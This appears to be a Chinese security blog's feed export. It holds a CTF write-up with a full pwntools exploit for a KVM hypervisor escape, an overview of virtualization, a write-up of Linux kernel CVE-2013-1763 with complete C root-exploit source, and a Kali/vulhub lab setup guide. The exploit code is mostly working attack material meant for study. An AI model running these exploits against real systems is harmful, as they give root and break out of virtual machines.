0, 'rbp', 0x100) + "nop\nsh:\n")payload += shellcoder.sendline(payload)sleep(0.5)shellcode = asm( shellcraft.syscall('SYS_mmap', 0, 0x1000000, 7, 0, -1, 0) + shellcraft.syscall('SYS_read', 0, 'rax', 0x1000000))r.sendline(shellcode)sleep(0.5)k_shellcode = "\x90" * 0xe78 + asm(""" lea rdi, [rip + flag] and rdi, 0xfffff call hp_open mov rdi, rax mov rsi, 0 cdq mov dh, 1 call hp_read mov rdi, 1 mov rsi, 0 mov rdx, rax call hp_write hlt hp_open: mov esi, edi mov edi, 0x8000 jmp hypercallhp_read: lea rax, [rip+buf] mov qword ptr [rax], rdi mov qword ptr [rax+8], rsi mov qword ptr [rax+16], rdx mov esi, eax mov edi, 0x8001 jmp hypercallhp_write: lea rax, [rip+buf] mov qword ptr [rax], rdi mov qword ptr [rax+8], rsi mov qword ptr [rax+16], rdx mov esi, eax mov edi, 0x8002 jmp hypercallhypercall: mov dx, di mov eax, esi out dx, eax in eax, dx mov edi, eax mov eax, edi ret flag: .string "flag2" buf:""")r.sendline(k_shellcode)r.interactive() hypervisor.elf hypervisor里有一个0x8008的port可以处理ioctl请求,且没有做任何检查.可以用KVM_SET_USER_MEMORY_REGION将hypervisor其他的可写内存给插到VM里面. 首先通过/proc/self/maps文件泄露地址,之后构造一个memory region. 1234567struct kvm_userspace_memory_region region = &#123; .slot = 1, .flags = 0, .guest_phys_addr = 0x2000000, .memory_size = 0x21000, .userspace_addr = [stack_addr]&#125;; 但现在还不能直接在kernel中访问这块地址,因为它没有页表项.在64位的long mode下,所有的访存都需要经过页表,而hypervisor和kernel并没有为高于0x2000000设置页映射,所以需要手动为它加上一个页表项. kernel在刚启动时对page table做了下面的操作. 12345678910111213/* Maps * 0x8000000000 ~ 0x8002000000 -&gt; 0 ~ 0x2000000 */void init_pagetable() &#123; uint64_t* pml4; asm("mov %[pml4], cr3" : [pml4]"=r"(pml4)); uint64_t* pdp = (uint64_t*) ((uint64_t) pml4 + 0x3000); pml4[1] = PDE64_PRESENT | PDE64_RW | (uint64_t) pdp; // 0x8000000000 uint64_t* pd = (uint64_t*) ((uint64_t) pdp + 0x1000); pdp[0] = PDE64_PRESENT | PDE64_RW | (uint64_t) pd; for(uint64_t i = 0; i &lt; 0x10; i++) pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (i * KERNEL_PAGING_SIZE);&#125; 在PML4第1项上放了1个PDP,在PDP中初始化了16个page,这些page都是带有PDE64_PS标志位的,这代表着它们不是下一级PD的地址,而是1个0x200000的page的直接映射.因为PML4第1项对应的Virtual Address的39-47位为1,实际上就是一组0x8000000000 ~ 0x8002000000到0 ~ 0x2000000的映射. 同理,可以在PDP的末尾加上1项,将0x8002000000 ~ 0x8002200000映射到0x2000000 ~ 0x2200000,这样就可以通过0x8002000000来访问物理地址0x2000000,也就是hypervisor栈的底部了. 之后就是在这段内存中搜索KVM_RUN这个ioctl调用的返回地址,并把ROP链布置上去,再用hlt触发中断就可以了. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191from pwn import *context.arch = "amd64"r = process("./hypervisor.elf kernel.bin ld.so.2 ./user.elf", shell = True)#r = process("./user.elf")#gdb.attach(r)r.recvuntil("keep going down.\n")payload = str((0x2020a4 - 0x202020) / 4 - 2) + "_\\"payload += "z:" + str(0x2030a4 + 0x20 - 0x796) + "+z;,"payload = payload.ljust(0x20, '?')shellcode = asm( "lea rbp, [rip + sh]\n" + shellcraft.syscall('SYS_read', 0, 'rbp', 0x100) + "nop\nsh:\n")payload += shellcoder.sendline(payload)sleep(0.5)shellcode = asm( shellcraft.syscall('SYS_mmap', 0, 0x1000000, 7, 0, -1, 0) + shellcraft.syscall('SYS_read', 0, 'rax', 0x1000000))r.sendline(shellcode)sleep(0.5)k_shellcode = "\x90" * 0xe78 + asm(""" /* leak */ lea rdi, [rip + maps] and rdi, 0xfffff call hp_open mov rdi, rax mov rsi, 0 cdq mov dh, 0xff call hp_read mov rdi, 1 mov rsi, 0 mov rdx, rax call hp_write lea rdi, [rip + uaddr] call read_ptr lea rdi, [rip + libc_base] call read_ptr lea rdi, [rip + text_base] call read_ptr /* map stack =&gt; VM memory */ mov rdi, 4 /* vmfd */ mov rsi, 0x4020AE46 /* KVM_SET_USER_MEMORY_REGION */ lea rcx, [rip + region] mov edx, ecx call hp_ioctl test rax, rax jne hp_panic call extend_paging /* edit page table */ movabs rbp, 0x8002000000 mov rax, rbp mov rcx, [rip + text_base] add rcx, 0x1743 /* main's return address */loop2: cmp rcx, qword ptr [rax] /* find main's return address */ je break2 add rax, 8 jmp loop2break2: mov rcx, [rip + libc_base] add rcx, 0x4f2c5 /* one_gadget */ mov qword ptr [rax], rcx xor rcx, rcx hltextend_paging: mov rax, cr3 add rax, 0x4000 mov rdx, 0x10 /* i */loop: cmp rdx, 0x20 je break /* pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (i * KERNEL_PAGING_SIZE); */ mov rdi, rdx imul rdi, 8 mov rcx, rax add rcx, rdi mov rdi, rdx imul rdi, 0x200000 or rdi, 1 | (1 &lt;&lt; 1) | (1 &lt;&lt; 7) mov qword ptr [rcx], rdi inc rdx jmp loopbreak: retread_ptr: mov esi, edi xor rdi, rdi mov rdx, 8 jmp hp_readhp_open: mov esi, edi mov edi, 0x8000 jmp hypercallhp_exit: mov esi, edi mov edi, 0x8006 jmp hypercallhp_arg3: lea rax, [rip + buf] mov qword ptr [rax], rdi mov qword ptr [rax + 8], rsi mov qword ptr [rax + 16], rdx mov esi, eax rethp_read: call hp_arg3 mov edi, 0x8001 jmp hypercallhp_write: call hp_arg3 mov edi, 0x8002 jmp hypercallhp_ioctl: call hp_arg3 mov edi, 0x8008 jmp hypercallhp_panic: lea rdi, [rip + orz] mov eax, edi mov edi, 0xffff jmp hypercallhypercall: mov dx, di mov eax, esi out dx, eax in eax, dx mov edi, eax mov eax, edi retmaps: .string "/proc/self/maps"orz: .string "w4rd3n"buf: .quad 0 .quad 0 .quad 0region: slot: .long 1 flags: .long 0 gpa: .quad 0x2000000 mem_size: .quad 0x21000 uaddr: .quad 0 /* stack_base */libc_base: .quad 0text_base: .quad 0""")r.sendline(k_shellcode)pie = int(r.recvline()[:12], 16)r.recvuntil("/dev/zero (deleted)\n")libc = int(r.recvline()[:12], 16)r.recvuntil("/dev/zero (deleted)\n")r.recvuntil("ld-2.27.so\n")r.recvuntil("ld-2.27.so\n")r.recvline()stack = int(r.recvline()[:12], 16)r.send(p64(stack) + p64(libc) + p64(pie))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-virtualization-基础]]></title>
    <url>%2Fposts%2Ff5e0957%2F</url>
    <content type="text"><![CDATA[虚拟化初探 在计算机中,虚拟化是指创建一个虚拟版本的计算机,包括硬件,存储设备和网络资源. 管理程序(Hypervisor)或VMM(Virtual Machine Monitor,虚拟机监视器)是一种可以在同一物理硬件上创建分离的多台(虚拟)机器的软件.VMM是在给出的虚拟化环境中管理CPU,内存,I/O设备,中断和指令集的软件.hypervisor可能指带有VMM的操作系统.这两个术语也可以被认为是同义词. 虚拟机管理程序需要考虑:CPU虚拟化(特权指令);内存虚拟化(页表);IO设备虚拟化(网络,磁盘,BIOS). 论文虚拟化第三代体系结构的正式要求准确定义了为了有效的支持虚拟化所需满足的条件. 等价性:程序运行在虚拟机中和运行在本地完全相同,不包括资源可用性和时间的差异. 性能:绝大多数的客户指令由硬件执行,没有VMM的介入. 安全性:VMM管理所有硬件资源. 早期的虚拟化技术被称为陷阱和模拟(经典虚拟化),也就是VMM捕获客户机操作系统运行特定指令(敏感指令或特权指令)时发生的异常并模拟完成该指令. 由于许多如敏感非特权指令的阻碍,x86不是可经典虚拟化的. VMM 操作系统是设计直接运行在裸硬件设备上的,它认为自己完全占有计算机硬件. x86架构提供四个特权级别给操作系统和应用程序来访问硬件.由于宿主操作系统是工作在Ring 0的,那么客户操作系统就不能也在Ring 0.但是客户操作系统不知道,所以执行特权指令时就会出错. 虚拟机管理程序(VMM)就是处理这种情况的,根据其原理不同有三种实现技术. 全虚拟化. 半虚拟化. 硬件辅助的虚拟化. 管理程序又可以分为以下三类. 裸机管理程序(例如Xen,VMWare ESXi,Hyper-V). 主机管理程序(例如VirtualBox,VMWare Workstation). 仅主机管理程序(例如SimpleVisor,HyperPlatform,kvm). 基于二进制翻译的全虚拟化 客户操作系统运行在Ring 1,它在执行特权指令时会触发异常,然后VMM捕获这个异常,在异常里面做翻译,模拟,最后返回到客户操作系统内,客户操作系统认为自己的特权指令工作正常,继续运行. 这种处理方式性能损耗大. 早期的VMWare Workstation针对x86架构特殊设计的就是这种实现.VMWare打包为一个正常的应用程序被运行在宿主操作系统上,同时每个虚拟机实例以进程(vmware-vmx.exe)的形式运行在宿主操作系统上. VMWare的VMM可以在系统级运行,在一段有限的时间内完全控制硬件,在这段时间内宿主操作系统被从虚拟和线性内存中短暂移除.VMM和宿主操作系统的上下文切换又称为世界切换,每个上下文有自己的地址空间,中断描述符表,堆栈,执行上下文.也就是说驻留在宿主机的VMM驱动程序通过Ring 0的权能实现了一系列操作,包括锁定物理内存页,转发中断以及调用世界切换原语. VMM保护 VMM必须为自己保留部分客户机虚拟地址空间同时阻止客户机访问VMM正在使用的客户机VA空间的那些部分,否则就会出现安全问题,也就是虚拟机逃逸. 客户机用户模式应用在Ring 3正常运行,而客户机内核代码被降权在运行在Ring 1或%cpl = 1上的二进制翻译下运行.此时虚拟机段被VMM截断来确保它们不会与VMM自身重叠,任何尝试从VM访问VMM段的行为会触发会被VMM正确处理的通常保护错误. 同时VMM预留一个段寄存器%gs,用来始终指向VMM区域.二进制翻译器保证在翻译时没有虚拟机指令会直接使用gs前缀,翻译后的代码将fs寄存器用于最初具有fs或gs前缀的VM指令. VMM截断段的方式是通过不改变基址减少段描述符的范围,这会导致VMM必须在地址空间的最顶端区域.在实现中VMWare设置VMM的大小为4MB. CPU虚拟化 VMWare使用DE运行客户机用户模式应用以及BT运行客户机系统代码(内核). BT(二进制翻译)将输入的可执行指令序列转换成可以在目标系统自身上执行的二进制指令序列,动态二进制翻译器在运行时通过存储目标序列到称为翻译缓存的缓冲区中来执行翻译. 内存虚拟化 虚拟内存到物理内存的转换由MMU通过名为页表的查找表完成,当尝试访问某些虚拟内存时硬件页面遍历器遍历那些页表来将VA翻译为PA.同时结果会缓存在成为TLB的CPU缓存中. VMM通过名为影子页表的技术管理从客户机物理内存到机器物理内存的映射. 设备虚拟化 VMWare使用宿主操作系统的设备资源接口来执行虚拟机中对资源的调用. 超虚拟化/类虚拟化-Paravirtualization 类虚拟化的思想就是,修改操作系统内核,替换掉不能虚拟化的指令,通过超级调用(hypercall)直接和底层的虚拟化层hypervisor来通讯,hypervisor同时也提供了hypercall接口来满足其他关键内核操作,比如内存管理,中断和时间保持.这种做法省去了全虚拟化中的捕获和模拟. 对于Xen这种类虚拟化技术,客户机操作系统都是有一个专门的定制内核版本,和x86,mips这些内核版本等价.性能损耗非常低. Xen中用域来指代正在运行客户操作系统的虚拟机.Domain0是Xen管理程序启动时的第一个域,会运行一个Linux操作系统,该域可以访问硬件及管理其他域.其他域被称为DomUs,能运行任何已经移植到Xen的操作系统. VMM保护 和VMWare一样,客户操作系统内核被降权后占据Ring 1,Xen占据在Ring 0,用户模式应用依然运行在Ring 3. Xen被映射到每个客户操作系统的顶部64M内存的地址空间中,以节省TLB刷新.虚拟机的段被VMM截断以确保它们不会与VMM自身重叠. 用户模式应用使用被截断的段运行,并受到自身操作系统的限制,无法使用页保护pet.us来访问客户内核区域. CPU虚拟化 无论何时客户机需要执行一个特权操作,客户机使用hypercall来跳转到Xen中,可以把hypercall看作是允许用户代码以可信代码的控制和管理的方式执行特权指令. hypercall在一个常规的操作系统中以类似系统调用的方式被调用:一个软中断被引发,中断的向量指向Xen中的入口点.32位x86机器上指令是int 0x82,64位是syscall. hypercall的向量编号被放在eax中,在xen/include/public/xen.h可以找到讲这些值与符号hypercall名称相映射的列表. 异常,包括内存错误和软件陷入,在x86上直接被虚拟化了.提供了一个虚拟IDT,一个域可以通过HYPERVISORsettraptable这个hypercall向Xen提交陷入处理程序表.大多数陷阱处理程序和原生x86的处理程序是相同的,因为在Xen的类虚拟化架构中,异常栈帧是没有被修改的. 但页错误处理程序有些不同,原因是正常的页错误处理程序从CR2读取导致错误的地址,这需要Ring 0权限.所以Xen将错误的地址写入扩展栈帧,当在Ring 0外执行时发生了异常,Xen的处理程序在客户机操作系统栈上创建异常栈帧的副本,并将控制权返回给相应的已注册的处理程序. 位于xen/i386/kernel/entry.S的文件包含了系统调用和故障低级处理程序. 内存虚拟化 客户操作系统只允许对实际页表进行只读访问,必须通过hypercall更新页表,而不是直接写内存,以防止客户操作系统做了不可接受的更改. 每次客户操作系统请求一个新的页表,它会从自身的保留的内存中分配并初始化页,并将其注册到Xen.客户操作系统可以批量请求更新以缓解进入管理程序的开销. 设备虚拟化 Xen通过特权域(Domain0或者特权级驱动程序域)管理实际设备,然后给所有的客户机导出一类通用设备. Xen所使用的架构称为分离驱动程序模型,即非特权客户机运行前端驱动程序,而直接访问设备的特权域运行后端驱动程序,后端驱动程序了解特定物理设备的底层细节.该类虚拟化模型允许客户操作系统只为每种通用类型的设备实现一种设备驱动程序,随后依赖于特权域中的操作系统来获得实际物理设备的设备驱动程序. 大多数主流的虚拟机管理程序以建立在环缓冲区的共享内存来实现前端驱动程序和后端驱动程序的通讯.通过PV驱动程序垂直传递缓冲区信息的高性能通讯机制的优势使这种通讯很容易实现. 在Hyper-V中,后端被称为虚拟化服务提供者,前端被称为虚拟化服务客户端. Xen的最后一个选项是能够将物理设备直接授权给非特权域,如果不支持虚拟化特定设备或者如果需要尽可能高的性能的话. 硬件辅助虚拟化 2005年后,Intel和AMD开始支持虚拟化,Intel引入Intel-VT技术,增加了VMX root operation和VMX non-root operation两种模式,两种模式都支持所有的4个运行级别. 这样,VMM可以运行在VMX root operation模式下,客户OS运行在VMX non-root operation模式下. 运行在VMX root operation 模式下的VMM通过显式调用VMLAUNCH或VMRESUME指令切换到VMX non-root operation模式,硬件自动加载Guest OS的上下文,于是Guest OS获得运行,这种转换称为VM entry. 客户机操作系统运行过程中遇到需要VMM处理的事件,例如外部中断或缺页异常,或者主动调用VMCALL指令调用VMM的服务的时候(与系统调用类似),硬件自动挂起客户机操作系统,切换到VMX root operation模式,恢复VMM的运行,这种转换称为VM exit. VMX root operation模式下软件的行为与在没有VT-x技术的处理器上的行为基本一致.而VMX non-root operation模式则有很大不同,最主要的区别是此时运行某些指令或遇到某些事件时,会发生VM exit. guest:客户机系统,包括CPU(vCPU),内存,驱动,被kvm置于一种受限制的CPU模式下运行. kvm:运行在内核空间,提供CPU和内存的虚拟化,以及guest的I/O拦截. qemu:运行在用户空间,提供硬件I/O虚拟化,通过/dev/kvm设备和虚拟机交互. qemu与kvm就是一套基于硬件辅助的全虚拟化的实现.kvm主要功能是初始化CPU硬件打开虚拟化模式,然后将虚拟客户机运行在虚拟机模式下,并对其运行提供一定的支持. 以在Intel上运行为例,kvm模块被加载的时候,首先初始化kvm内部的数据结构,然后打开CPU控制及存取CR4的虚拟化模式开关,并通过执行VMXON指令将宿主操作系统置于VMX root operation.最后kvm模块创建特殊设备文件/dev/kvm并等待来自用户空间的指令. kvm需要一个用户程序通过/dev/kvm接口来设置一个虚拟服务器的地址空间和向虚拟机提供模拟的I/O设备并将界面显示映射回宿主机的显示屏供用户操作. 这个程序就是qemu-kvm(qemu-kvm是qemu的一个分支,但现在两者已经没有区别),在qemu-kvm中,kvm的虚拟机被实现为常规的Linux进程,即一个qemu-kvm进程,由标准调度程序调度. 该进程包括几种线程:I/O线程用于管理模拟设备,vCPU线程用于运行Guest代码,和处理event loop,offloaded tasks的线程. 然后由qemu和kvm相互配合进行虚拟机的创建和运行,两者的通信主要是针对特殊设备文件dev/kvm的ioctl调用. 创建虚拟机时kvm会分配对应的内核数据结构,同时返回一个文件句柄来代表所创建的虚拟机.针对该句柄的调用可以对虚拟机做相应地管理,比如创建用户空间虚拟地址和客户机物理地址,真实物理地址之间的映射关系,运行虚拟机等. CPU虚拟化 kvm为每一个vCPU生成对应的文件句柄,用于进行包括执行虚拟处理器在内的一些操作,虚拟机在kvm的支持下置于VMX non-root operation模式下执行二进制指令. 普通的Linux内核有两种执行模式:内核模式(Kenerl)和用户模式(User).为了支持带有虚拟化功能的CPU,kvm向Linux内核增加了第三种模式即客户机模式,对应于CPU的VMX non-root mode.在non-root模式下,所有敏感的二进制指令都被CPU捕捉到,CPU在保存现场之后自动切换到VMX root operation模式,由kvm决定如何处理. kvm内核模块作为用户模式和客户机模式之间的桥梁,用户模式中的qemu-kvm会通过ioctl命令来运行虚拟机,kvm内核模块收到该请求后,它先进行初始化,比如将vCPU上下文加载到VMCS等,然后使CPU进入VMX non-root模式,开始执行客户机代码. 三种模式的分工. Guest模式:执行客户机系统非I/O代码,并在需要的时候驱动CPU退出该模式. Kernel模式:负责将CPU切换到Guest模式执行代码,并在CPU退出Guest模式时回到Kernel模式. User模式:替代客户机系统执行I/O操作. kvm虚拟机基于vCPU,而vCPU作为qemu线程被Linux作为普通的线程/轻量级进程调度到物理CPU上,所以虚拟机代码是运行在物理CPU之上. 要将虚拟机的线程调度到某个物理CPU,需要经历两个过程:虚拟机线程调度到vCPU,该调度由虚拟机操作系统负责;vCPU线程调度到物理CPU即主机物理CPU,该调度由Hypervisor即Linux负责. 内存虚拟化 除了CPU的虚拟化,内存虚拟化也由kvm实现.kvm的内存虚拟化就是一个将虚拟机的虚拟内存转换为宿主机物理内存的过程,Guest使用的依然是宿主机的物理内存. CPU中的内存管理单元MMU是通过页表的形式将程序运行的虚拟地址转换成实际物理地址. kvm实现虚拟机内存的方式是,利用mmap系统调用,在qemu-kvm主线程的虚拟地址空间中申明一段连续的大小的空间用于客户机物理内存映射. 在虚拟机模式下,MMU的页表则必须在一次查询的时候完成两次地址转换,因为除了将客户机程序的虚拟地址转换了客户机的物理地址外,还要将客户机物理地址转化成真实物理地址. 内存虚拟化有两种实现方式:通过软件实现内存地址的翻译,比如Shadow page table;或者通过基于CPU的辅助虚拟化功能,比如AMD的NPT和Intel的EPT技术. 影子页表由软件(qemu-kvm)维护,实际上就是一个Guest的页表到宿主机页表的映射,每一级的页表的hash值对应到qemu-kvm中影子页表的一个目录. 在初次GVA -&gt; HPA(客户机虚拟地址到宿主机物理地址)的转换时候,Guest产生缺页中断,和传统的转换过程一样,经过两次转换,然后影子页表记录这个转换关系.坏处在于qemu-kvm需要为Guest的每个进程维护一个影子页表,带来很大的内存开销. EPT可以看做一个硬件的影子页表,在Guest中增加EPT寄存器. 当Guest产生了CR3和页表的访问时会产生缺页异常,如果在软件模拟或者影子页表的虚拟化方式中,此时会有VM退出,qemu-kvm进程接管并获取到此异常. 但是在EPT中,qemu-kvm忽略此异常,按照传统的缺页中断处理,产生EXIT_REASON_EPT_VIOLATION,然后Guest退出,qemu-kvm捕获到异常,分配物理地址建立GVA -&gt; HPA的映射并保存到EPT中,将EPT载入到MMU,下次转换时候直接查询根据CR3查询EPT表来完成GVA -&gt; HPA的转换. 其他优化技术 Kernel SamePage Merging,KSM作为内核中的守护进程存在,定期执行页面扫描识别副本页面并合并副本,从而释放这些页面.因此,在多个进程中,Linux将内核相似的内存页合并成一个内存页. 这个特性被kvm用来减少多个相似的虚拟机的内存占用,提高内存的使用效率. kvm虚拟机还有一个优化技术:Huge Page Backed Memory.x86 CPU通常使用4Kb内存页,经过配置后能够使用巨页(huge page).使用巨页则kvm的虚拟机页表将使用更少的内存,并且提高CPU的效率.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>virtualization</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-kernel-CVE-2013-1763]]></title>
    <url>%2Fposts%2F30c17dd1%2F</url>
    <content type="text"><![CDATA[准备与漏洞分析 下载源码:https://mirrors.tuna.tsinghua.edu.cn/kernel/v3.x/linux-3.7.1.tar.bz2. 在虚拟机中解压:tar -jxvf linux-3.7.1.tar.bz2. patch:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0. 漏洞点在于没有检查数组越界.可以伪造函数指针进行越权. 1234567891011121314151617181920212223static struct sock_diag_handler *sock_diag_handlers[AF_MAX];static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh) &#123; int err; struct sock_diag_req *req = NLMSG_DATA(nlh); struct sock_diag_handler *hndl; if (nlmsg_len(nlh) &lt; sizeof(*req)) return -EINVAL; hndl = sock_diag_lock_handler(req-&gt;sdiag_family);//数组越界 if (hndl == NULL) err = -ENOENT; else err = hndl-&gt;dump(skb, nlh);//伪造函数指针 sock_diag_unlock_handler(hndl); return err;&#125;static const inline struct sock_diag_handler *sock_diag_lock_handler(int family) &#123; if (sock_diag_handlers[family] == NULL) request_module("net-pf-%d-proto-%d-type-%d", PF_NETLINK, NETLINK_SOCK_DIAG, family); mutex_lock(&amp;sock_diag_table_mutex); return sock_diag_handlers[family];//数组越界&#125; 编译内核需要切换gcc-4.7:sudo update-alternatives --config gcc. 由于perl版本问题需要将kernel/timeconst.pl中的373:if(!define(xxx))的define()省略. 123make mrpropermake ARCH=i386 menuconfigmake ARCH=i386 bzImage -j8 &amp;&amp; make ARCH=i386 vmlinux -j8 编译exp时报错. 12345w4rd3n@w4rd3n-hack:~$ gcc -m32 -o exp -static -I linux-3.7.1/ exp.cIn file included from /usr/include/sys/socket.h:38:0, from exp.c:2:/usr/include/bits/socket.h:349:24: fatal error: asm/socket.h: No such file or directorycompilation terminated. 执行以下命令即可. 12cd /usr/includesudo ln -s asm-generic/ asm 运行. 1qemu-system-i386 -kernel linux-3.7.1/arch/x86/boot/bzImage -initrd rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" --nographic -gdb tcp::1234 exploit代码分析 现在已经可以通过数组越界跳转到其他任意地址,问题在于跳转到哪. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546struct nlmsghdr &#123; __u32 nlmsg_len; /* Length of message including header */ __u16 nlmsg_type; /* Message content */ __u16 nlmsg_flags; /* Additional flags */ __u32 nlmsg_seq; /* Sequence number */ __u32 nlmsg_pid; /* Sending process port ID */&#125;;struct unix_diag_req &#123; __u8 sdiag_family; __u8 sdiag_protocol; __u16 pad; __u32 udiag_states; __u32 udiag_ino; __u32 udiag_show; __u32 udiag_cookie[2];&#125;;struct sock_diag_handler &#123; __u8 family; int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);&#125;;struct netlink_table &#123; struct nl_portid_hash hash; struct hlist_head mc_list; struct listeners __rcu *listeners; unsigned int flags; unsigned int groups; struct mutex *cb_mutex; struct module *module; void (*bind)(int group); int registered;&#125;;struct nl_portid_hash &#123; struct hlist_head *table; 四个字节 unsigned long rehash_time; //也是四个字节.0x00012b59 unsigned int mask; unsigned int shift; unsigned int entries; unsigned int max_shift; u32 rnd;&#125;;static struct netlink_table *nl_table; nl_table里面有一个变量rehash_time的值正好在0x10000-0x130000这个区域内,所以可以利用这个值来跳转,只需要使sock_diag_handlers[sdiag_family] - dump正好落在这个值上就可以了. 12345678$ cat /proc/kallsyms | grep nl_tablec09f2180 d nl_table_lockc09f2184 d nl_table_waitc0b328c0 b nl_table_usersc0b328c4 b nl_table$ cat /proc/kallsyms | grep sock_diag_handlersc0b32780 b sock_diag_handlers#(0xc0b328c4 - 0xc0b32780) / 4 = 81 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;errno.h&gt;#include &lt;linux/if.h&gt;#include &lt;linux/filter.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;linux/sock_diag.h&gt;#include &lt;linux/inet_diag.h&gt;#include &lt;linux/unix_diag.h&gt;#include &lt;sys/mman.h&gt;typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);_commit_creds commit_creds;_prepare_kernel_cred prepare_kernel_cred;int __attribute__((regparm(3))) //这是指示GCC编译器选用3个寄存器代替堆栈来传递参数。kernel_code() &#123; commit_creds(prepare_kernel_cred(0)); //这行代码执行之后就可以获取root权限，但是这两个函数都是内核函数，必须在内核态执行才有效。 return -1;&#125;int main() &#123; int fd; struct &#123; struct nlmsghdr nlh; struct unix_diag_req r; &#125; req; char buf[8192]; if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) &lt; 0)&#123; printf("Can't create sock diag socket\n"); return -1; &#125; memset(&amp;req, 0, sizeof(req)); req.nlh.nlmsg_len = sizeof(req); req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY; req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST; req.nlh.nlmsg_seq = 123456; req.r.udiag_states = -1; req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN; commit_creds = (_commit_creds) 0xc025ae80; prepare_kernel_cred = (_prepare_kernel_cred) 0xc025b0c0; req.r.sdiag_family = 81; unsigned long mmap_start, mmap_size; mmap_start = 0x10000; mmap_size = 0x120000; printf("mmapping at 0x%lx, size = 0x%lx\n", mmap_start, mmap_size); if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) &#123; printf("mmap fault\n"); exit(1); &#125; memset((void *)mmap_start, 0x90, mmap_size); //将其全部填充为NOP char jump[] = "\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"; /* int jump(void *skb, void *nlh) &#123; asm volatile ( "mov $kernel_code, %eax\n" "call *%eax\n" ); &#125; */ unsigned long * asd = &amp;jump[4]; * asd = (unsigned long)kernel_code; //使用kernel_code函数的地址替换掉jump[]中的0x11 memcpy((void *)mmap_start + mmap_size - sizeof(jump), jump, sizeof(jump)); //触发漏洞 if (send(fd, &amp;req, sizeof(req), 0) &lt; 0) &#123; printf("bad send\n"); close(fd); return -1; &#125; printf("uid = %d, euid = %d\n", getuid(), geteuid() ); if(!getuid()) system("/bin/sh");&#125;]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-kali虚拟机环境搭建]]></title>
    <url>%2Fposts%2F612b543a%2F</url>
    <content type="text"><![CDATA[apt换源 1234sudo apt-get install leafpadsudo leafpad /etc/apt/sources.listsudo apt-get updatesudo apt-get full-upgrade sources.list. 12deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib docker 12345678curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' &gt; /etc/apt/sources.list.d/docker.list#需要为root用户sudo apt-get updatesudo apt-get remove docker docker-engine docker.iosudo apt-get install docker-cesudo vim /etc/docker/daemon.json# &#123;"registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]&#125; 123systemctl start dockersystemctl enable docker#开机自启 docker-compose安装. 123curl -L https://github.com/docker/compose/releases/download/1.8.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-composeln -s /usr/local/bin/docker-compose /usr/bin/docker-compose 使用dockerfly管理docker. 12docker pull helyho/dockerflydocker run --name dockerfly -d -v /var/run/docker.sock:/var/run/docker.sock --restart always -p 28083:28083 helyho/dockerfly 访问:http://127.0.0.1:28083,使用:admin/1234登录到dockerfly. penetration vulhub 12345678910111213cd ~wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zipcd vulhub-mastercd flask/ssti#进入某一个漏洞/环境的目录docker-compose build#自动化编译环境docker-compose up -d#启动整个环境docker-compose down -v#测试完成后,删除整个环境 VulApps 12git clone https://github.com/Medicean/VulApps.gitdocker pull medicean/vulapps]]></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-compiler-principles-基础]]></title>
    <url>%2Fposts%2F493cdcda%2F</url>
